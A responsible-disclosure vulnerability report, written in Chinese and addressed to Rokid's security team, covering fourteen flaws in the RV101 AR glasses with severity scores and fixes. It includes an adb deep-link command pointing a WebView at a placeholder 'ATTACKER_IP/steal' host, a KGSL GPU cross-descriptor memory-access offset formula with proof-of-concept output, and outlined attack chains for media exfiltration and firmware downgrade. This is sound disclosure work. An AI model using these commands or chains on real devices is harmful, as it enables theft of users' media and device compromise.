# Rokid 產品安全漏洞報告

> English: [Rokid_漏洞報告信件_EN.md](Rokid_%E6%BC%8F%E6%B4%9E%E5%A0%B1%E5%91%8A%E4%BF%A1%E4%BB%B6_EN.md)

> 📌 **事實依據**：本檔涉及裝置世代、kernel config、CVE 狀態、GhostLock 位移與產品結構等事實時，一律以 [`reports/FACTS.md`](FACTS.md) 為準（單一權威事實表；衝突時以該表裁決）。


**收件人：** security@rokid.com  
**寄件人：** 獨立安全研究員  
**日期：** 2026 年 2 月 19 日  
**主旨：** Rokid AR Glasses (RV101) 多項安全漏洞通報  
**報告編號：** RKID-SEC-2026-EXT-001  
**機密等級：** 限閱

---

Rokid 安全團隊，您好：

本人為獨立資安研究員，長期關注穿戴式裝置之安全性。近期針對 Rokid AR Glasses（型號 RV101）進行安全評估，發現多項安全漏洞，依據貴公司安全中心公布之漏洞回報機制（https://global.rokid.com/pages/security-center），特此提交完整報告，期望協助貴公司提升產品安全防護能力。

本報告**嚴格遵循負責任揭露原則**，在貴公司發布正式安全公告前，不會對外公開任何漏洞細節。

---

## 一、受影響產品與版本資訊

| 項目               | 詳情                              |
| ------------------ | --------------------------------- |
| **產品名稱**       | Rokid AR Glasses                  |
| **型號**           | RV101 (NEO LUNA-V2)               |
| **韌體版本**       | 1.12.009-20260109-150201          |
| **Android 版本**   | 12 (API 32)                       |
| **Linux 核心版本** | 5.10.209-perf-gb80a8319d11b       |
| **安全補丁等級**   | 2024-07-05                        |
| **SoC 平台**       | Qualcomm (SoC ID 579)             |
| **GPU**            | Adreno 621v1 (Chip ID: 0x6020100) |

---

## 二、漏洞總覽

共計發現 **3 項嚴重 (Critical)**、**5 項高風險 (High)**、**6 項中風險 (Medium)** 漏洞，以下依嚴重程度分類說明。

| 編號    | 風險等級 | 漏洞名稱                                      | CVSS 3.1 |
| ------- | -------- | --------------------------------------------- | -------- |
| VULN-01 | 🔴 嚴重  | Bootloader 未鎖定，Verified Boot 失效         | 9.8      |
| VULN-02 | 🔴 嚴重  | 安全補丁過期超過 19 個月                      | 9.1      |
| VULN-03 | 🔴 嚴重  | GateServiced Root 權限網路服務暴露 (TCP 8341) | 8.6      |
| VULN-04 | 🟠 高    | KGSL GPU 驅動跨 FD 記憶體存取漏洞             | 7.8      |
| VULN-05 | 🟠 高    | TrustZoneAccessService 未授權存取             | 8.4      |
| VULN-06 | 🟠 高    | ADB 持久啟用與預載授權金鑰導致媒體資料外洩    | 7.5      |
| VULN-07 | 🟠 高    | OTA 認證機制使用弱加密 (MD5)                  | 7.2      |
| VULN-08 | 🟠 高    | Rokid App WebView XSS 與敏感資料洩漏          | 7.5      |
| VULN-09 | 🟡 中    | 特權應用過度授權 (assistserver 100+ 權限)     | 5.5      |
| VULN-10 | 🟡 中    | I2C 裝置未限制存取 (PMIC/顯示器/電池管理)     | 5.5      |
| VULN-11 | 🟡 中    | dmesg 核心日誌未限制讀取                      | 5.0      |
| VULN-12 | 🟡 中    | SecCamService 安全相機服務未授權暴露          | 5.5      |
| VULN-13 | 🟡 中    | 相機隱私 LED 可被程式關閉                     | 4.6      |
| VULN-14 | 🟡 中    | 應用程式日誌洩漏支付 API 金鑰與簽名           | 5.5      |

---

## 三、嚴重漏洞詳細說明

### VULN-01：Bootloader 未鎖定，Verified Boot 失效

**CVSS 評分：** 9.8 (Critical)  
**CWE 分類：** CWE-693 (Protection Mechanism Failure)

**技術描述：**

設備的 Bootloader 處於解鎖狀態，驗證開機狀態為「orange」：

```
ro.boot.flash.locked = 0
ro.boot.verifiedbootstate = orange
ro.boot.vbmeta.device_state = unlocked
```

**安全影響：**

- 攻擊者可刷入惡意韌體，植入持久性後門
- Verified Boot 保護機制完全失效
- 設備重置後惡意韌體仍可存續
- 結合 ADB 存取，可形成完整的供應鏈攻擊

**修補建議：**

1. 量產設備出廠前鎖定 Bootloader
2. 確保 OTA 更新流程驗證 vbmeta 簽名完整性
3. 實施運行時完整性檢查機制

---

### VULN-02：安全補丁過期超過 19 個月

**CVSS 評分：** 9.1 (Critical)  
**CWE 分類：** CWE-1104 (Use of Unmaintained Third Party Components)

**技術描述：**

設備安全補丁等級為 2024-07-05，距今已超過 19 個月。期間 Google 與 Qualcomm 已發布眾多關鍵安全修補，包括但不限於：

| CVE 編號       | 嚴重性   | 元件                   | 說明                         |
| -------------- | -------- | ---------------------- | ---------------------------- |
| CVE-2024-32896 | Critical | Android Framework      | 權限提升                     |
| CVE-2024-29748 | Critical | Kernel                 | 遠端程式碼執行               |
| CVE-2024-36971 | High     | Linux Kernel net/route | UAF 漏洞（已驗證設備受影響） |
| CVE-2025-21479 | High     | Qualcomm KGSL          | GPU micronode 記憶體損壞     |

**修補建議：**

1. 緊急發布包含最新安全補丁的韌體更新
2. 建立每月或至少每季度的安全補丁更新機制
3. 安全補丁落後不應超過 90 天（Android CDD 合規要求）

---

### VULN-03：GateServiced Root 權限網路服務暴露

**CVSS 評分：** 8.6 (High)  
**CWE 分類：** CWE-250 (Execution with Unnecessary Privileges)

**技術描述：**

`GateServiced` 以 root 權限（UID 0）在所有網路介面上監聽 TCP 8341 端口：

```
State: LISTEN
Local Address: 0.0.0.0:8341
UID: 0 (root)
SELinux Context: u:r:tee:s0
Capabilities: 000001ffffffffff (全部)
```

init.rc 配置：

```
service GateServiced /vendor/bin/GateServiced
    user root
    group root system
```

**安全影響：**

- 任何可達該網路的裝置均可嘗試連線
- Root 權限運行意味著一旦被利用，攻擊者直接取得最高權限
- 擁有全部 Linux Capabilities，攻擊面極大

**修補建議：**

1. 將服務綁定至 127.0.0.1 或僅限必要網路介面
2. 降低服務運行權限，遵循最小權限原則
3. 實施強認證與加密機制
4. 移除非必要的 Capabilities

---

## 四、高風險漏洞詳細說明

### VULN-04：KGSL GPU 驅動跨 FD 記憶體存取漏洞

**CVSS 評分：** 7.8 (High)  
**CWE 分類：** CWE-284 (Improper Access Control)

**技術描述：**

Qualcomm KGSL GPU 驅動（`/dev/kgsl-3d0`，mode 0666）在同一進程內的多個 file descriptor 之間共享 GPU 記憶體頁表。攻擊者可透過計算 mmap offset，經由一個 fd 存取另一個 fd 所分配的 GPU 記憶體。

**PoC 已驗證結果：**

```
fd1 分配記憶體: gpuaddr=0x4000000000
fd1 寫入秘密值: 0xaabbccdd11223344
fd2 透過 mmap offset=0x1000 讀取: 0xaabbccdd11223344 ✅
fd2 修改後 fd1 可見變化 ✅ CONFIRMED
```

**Offset 計算公式：**

```
offset = (page_index + 1) * 0x1000
page_index = (gpuaddr - 0x4000000000) / 0x1000
```

**安全影響：**

- 繞過 fd 隔離機制，可能造成沙箱逃逸
- 讀取其他 fd 的敏感 GPU 資料（如 ML 模型權重、加密緩衝區）
- 竄改其他 fd 的 GPU 資料，若結合 SurfaceFlinger 等特權進程的 GPU Context，可能達成提權

**額外發現：**

1. **Double mmap 物理頁共享：** 對同一 GPU 地址多次 mmap 會映射到相同物理頁，可作為 TOCTOU 攻擊向量
2. **fd 關閉後映射仍有效：** 關閉 fd 後已建立的 100 個 mmap 映射全部仍可讀寫，存在記憶體洩漏風險

**修補建議：**

1. 確保每個 fd 擁有獨立的 GPU 記憶體頁表
2. 限制 `/dev/kgsl-3d0` 的存取權限（目前為 0666，建議限縮）
3. 在 fd 關閉時強制解除所有 mmap 映射

---

### VULN-05：TrustZoneAccessService 未授權存取

**CVSS 評分：** 8.4 (High)  
**CWE 分類：** CWE-862 (Missing Authorization)

**技術描述：**

`TrustZoneAccessService` 為 exported 服務且無任何權限要求：

```xml
<service android:name="...TZAccessService"
    android:enabled="true"
    android:exported="true">  <!-- 任何應用可存取 -->
```

白名單配置 `/vendor/etc/ssg/tz_whitelist.json` 中所有 TA 的 `permissions` 欄位均為空陣列，包括 App Loader、Device Attestation、Haven Token 等敏感功能。

**安全影響：**

- 任何第三方應用可綁定並存取 TrustZone Trusted Applications
- 可能取得設備證明金鑰
- 完全繞過 Android 安全模型

**修補建議：**

1. 將 `android:exported` 設為 `false` 或加入 signature-level 權限保護
2. 為白名單中每個 TA 設定明確的權限要求
3. 實施呼叫端身份驗證

---

### VULN-06：ADB 持久啟用與預載授權金鑰導致零點擊媒體資料外洩

**CVSS 評分：** 4.6 (Medium) / 若啟用 WiFi ADB 則為 7.5 (High)  
**CWE 分類：** CWE-921 (Storage of Sensitive Data in a Mechanism without Access Control)

**技術描述：**

設備 ADB 預設啟用且無法由使用者關閉：

```
persist.sys.usb.config = adb,diag
persist.vendor.adb = true
lockscreen.disabled = 1
```

更嚴重的是，`/data/misc/adb/adb_keys` 中預載了授權金鑰，包含一組 `root@raspberrypi` 金鑰（疑似工廠測試金鑰留存）。

**已驗證的資料外洩範圍：**

| 資料類型       | 數量                             | 說明                                                        |
| -------------- | -------------------------------- | ----------------------------------------------------------- |
| 照片           | 全部                             | /sdcard/DCIM/Camera/                                        |
| 影片           | 全部 (含 2400×1800@30fps 高畫質) | /sdcard/Movies/Camera/                                      |
| 螢幕截圖       | 全部                             | /sdcard/Screenshots/                                        |
| 螢幕錄影       | 全部                             | /sdcard/ScreenRecorder/                                     |
| IMU 感測器資料 | 70 萬行+                         | 每部影片附帶的陀螺儀/加速度計資料，可重建配戴者頭部運動軌跡 |

完整外洩僅需約 2-3 分鐘（USB 3.0），無需使用者確認、無需 root、無需利用任何漏洞。

**攻擊場景：**

- **惡意充電線攻擊：** 偽裝充電站即可在數分鐘內竊取所有媒體資料
- **供應鏈攻擊：** 若 `root@raspberrypi` 金鑰對跨裝置通用，持有私鑰者可存取所有出廠裝置

**修補建議：**

1. **P0 緊急：** 正式韌體中禁用 ADB（移除 `persist.vendor.adb=true`）
2. **P0 緊急：** 出廠前清除 `/data/misc/adb/adb_keys`，移除工廠測試金鑰
3. **P0 緊急：** 移除 Qualcomm `diag` USB 介面
4. 實施 ADB 連線用戶確認機制
5. 預設啟用 USB 限制模式（僅充電）

---

### VULN-07：OTA 認證機制使用弱加密

**CVSS 評分：** 7.2 (High)  
**CWE 分類：** CWE-328 (Use of Weak Hash)

**技術描述：**

OTA 更新檢查 API（`POST https://ota.rokid.com/v1/extended/ota/check`）使用以下認證方式：

1. 對稱金鑰（`key` 與 `secret`）硬編碼於系統屬性 `ro.boot.key` 與 `ro.boot.secret`
2. 簽名演算法為簡單 MD5 雜湊（非 HMAC）
3. 無伺服端 nonce，僅依賴時間戳防重放

透過 ADB 即可讀取所有認證參數，並已成功構建完整的 OTA API 呼叫腳本，可查詢任意韌體更新資訊與下載連結。

**安全影響：**

- 攻擊者可偽造 OTA 請求取得韌體下載連結
- MD5 已知存在碰撞漏洞，簽名可被偽造
- 結合 Bootloader 解鎖，可實施惡意韌體降級攻擊

**修補建議：**

1. 改用 HMAC-SHA256 或非對稱簽名（RSA/ECDSA）
2. 將金鑰儲存於硬體安全模組（如 TrustZone）中，而非系統屬性
3. 實施伺服端 nonce 防止重放攻擊
4. 韌體下載連結加入時效機制

---

### VULN-08：Rokid App WebView XSS 與敏感資料洩漏

**CVSS 評分：** 7.5 (High)  
**CWE 分類：** CWE-79 (Cross-site Scripting), CWE-532 (Information Exposure Through Log Files)

**技術描述：**

**WebView XSS（已驗證）：**

`JoyGoWebviewActivity`（JD Financial SDK）為 exported 且支援 BROWSABLE intent filter，可透過 `joygorokid://open?url=` scheme 載入任意 URL 並執行 JavaScript：

```bash
adb shell am start -a android.intent.action.VIEW \
    -d 'joygorokid://open?url=http://ATTACKER_IP/steal'
```

**日誌敏感資料洩漏（嚴重）：**

應用程式日誌（無需 root，僅需 `READ_LOGS` 權限或 ADB 即可讀取）中洩漏以下敏感資訊：

| 洩漏項目                                  | 風險              |
| ----------------------------------------- | ----------------- |
| 支付寶 RPC 完整 Payload（含 SN、簽名）    | 🔴 可偽造支付請求 |
| Payment AppKey: `<REDACTED_PAYMENT_APPKEY>` | 🔴 支付身份偽造   |
| Google Maps API Key                       | 🟡 帳單濫用       |
| 設備 UTDID 與指紋                         | 🟡 裝置追蹤       |

**修補建議：**

1. 移除 `JoyGoWebviewActivity` 的 exported 屬性或加入 URL 白名單驗證
2. 全面清理日誌中的敏感資訊（API 金鑰、支付參數、認證簽名）
3. 限制 logcat 存取權限

---

## 五、中風險漏洞摘要

| 編號    | 漏洞               | 說明                                                                                                       | 修補建議                           |
| ------- | ------------------ | ---------------------------------------------------------------------------------------------------------- | ---------------------------------- |
| VULN-09 | 特權應用過度授權   | `com.rokid.os.sprite.assistserver` 持有 100+ 系統權限，含 INJECT_EVENTS、MASTER_CLEAR、INSTALL_PACKAGES 等 | 依最小權限原則審查並移除非必要權限 |
| VULN-10 | I2C 裝置未限制     | `/dev/i2c-1`（mode 0666）可存取 PMIC (0x08)、顯示控制器 (0x30)、電池 IC (0x64) 等硬體                      | 限制 I2C 裝置檔案的存取權限        |
| VULN-11 | dmesg 未限制       | `dmesg_restrict=0`，任何應用可讀取核心日誌，洩漏記憶體位址與安全事件                                       | 設定 `kernel.dmesg_restrict=1`     |
| VULN-12 | SecCamService 暴露 | `exported=true` 且無權限要求，提供安全相機功能的 Native JNI 方法                                           | 設定 exported=false 或加入權限控制 |
| VULN-13 | 相機 LED 可被關閉  | 存在 `CAMERA_DISABLE_TRANSMIT_LED` 權限，惡意應用可在使用者不知情下錄影                                    | 硬體層級強制 LED 開啟              |
| VULN-14 | 日誌洩漏支付資訊   | 支付寶 RPC、API 金鑰、設備指紋等敏感資訊記錄於 logcat                                                      | 清理所有敏感日誌輸出               |

---

## 六、已知利用方法

本報告中涉及的漏洞，已驗證以下利用路徑：

### 路徑 A：ADB 物理存取攻擊鏈

```
USB 物理連接 → ADB 自動連線（預載金鑰）→ 全部媒體資料外洩（含 IMU）→ 零點擊完成
```

### 路徑 B：TrustZone 攻擊鏈

```
普通應用 → 綁定 TrustZoneAccessService → 存取 App Loader TA → 可能取得 TEE 權限
```

### 路徑 C：KGSL GPU 攻擊鏈

```
/dev/kgsl-3d0 存取 → 跨 FD 記憶體讀寫 → 嘗試篡改 SurfaceFlinger GPU 命令緩衝區 → 潛在提權
```

### 路徑 D：OTA 降級攻擊鏈

```
讀取系統屬性取得 OTA 金鑰 → 偽造 API 請求 → 取得韌體 → Bootloader 解鎖刷入惡意韌體
```

---

## 七、建議修補優先級

### 第一優先（建議 7 天內處理）

| 項目                                       | 影響                   |
| ------------------------------------------ | ---------------------- |
| 鎖定 Bootloader                            | 防止惡意韌體刷入       |
| 發布安全補丁更新（至少至 2025 年補丁等級） | 修補已知核心與驅動漏洞 |
| 禁用生產韌體中的 ADB，清除預載金鑰         | 防止零點擊媒體外洩     |
| 限制 GateServiced 監聽範圍與權限           | 降低網路攻擊面         |

### 第二優先（建議 30 天內處理）

| 項目                                                         | 影響                |
| ------------------------------------------------------------ | ------------------- |
| 修復 TrustZoneAccessService / SecCamService 的 exported 問題 | 防止未授權 TEE 存取 |
| 更新 OTA 認證機制為非對稱簽名                                | 防止韌體偽造        |
| 限制 `/dev/kgsl-3d0` 與 `/dev/i2c-1` 存取權限                | 降低硬體攻擊面      |
| 設定 `dmesg_restrict=1`                                      | 防止核心資訊洩漏    |

### 第三優先（建議 90 天內處理）

| 項目                                           | 影響              |
| ---------------------------------------------- | ----------------- |
| 全面審查應用程式權限（assistserver、支付寶等） | 遵循最小權限原則  |
| 清理所有日誌中的敏感資訊                       | 防止 API 金鑰洩漏 |
| 硬體層面強制相機 LED                           | 保護使用者隱私    |
| 建立定期安全更新機制                           | 長期安全維護      |

---

## 八、合規性關切

| 標準            | 影響                                                      |
| --------------- | --------------------------------------------------------- |
| **GDPR**        | AR 眼鏡可拍攝他人影像，媒體資料零保護外洩構成嚴重個資風險 |
| **Android CDD** | 安全補丁落後超過 90 天，不符合 Google 合規要求            |
| **PCI DSS**     | 支付功能的 API 金鑰與簽名洩漏於日誌中                     |

---

## 九、預期揭露時間表

| 日期       | 事項                                                |
| ---------- | --------------------------------------------------- |
| 2026-02-19 | 向 Rokid 安全團隊提交本報告                         |
| 2026-02-21 | 預期收到貴公司確認回覆（依據貴公司 48 小時承諾）    |
| 2026-05-19 | 90 天緩衝期限（業界標準），若尚未修補將評估公開揭露 |

本人承諾在 Rokid 發布正式安全公告前，不會對外揭露漏洞細節。若貴公司需要延長修補時間，歡迎透過郵件溝通合理的時間安排。

---

## 十、附件說明

如貴公司需要，本人可提供以下補充資料：

1. **各漏洞 PoC 原始碼**（含 KGSL 跨 FD 存取、OTA 認證破解腳本等）
2. **APK 反編譯分析結果**（TrustZoneAccessService、SecCamService、RokidSysConfig 等）
3. **完整技術分析報告**（各漏洞獨立報告，含可重現步驟）
4. **logcat 日誌截取樣本**（已遮蔽個人資料）

---

## 十一、聯絡方式

如有任何疑問或需要進一步技術討論，請透過以下方式聯繫：

- **Email：** [<RESEARCHER_EMAIL>]

期盼貴公司儘速回覆並安排修補。本人十分樂意配合驗證修補措施的有效性。

此致

敬禮

獨立安全研究員  
2026 年 2 月 19 日

---

_本報告依據負責任揭露原則撰寫，所有測試均在研究者自有設備上進行，未對任何第三方資料造成破壞或外洩。_
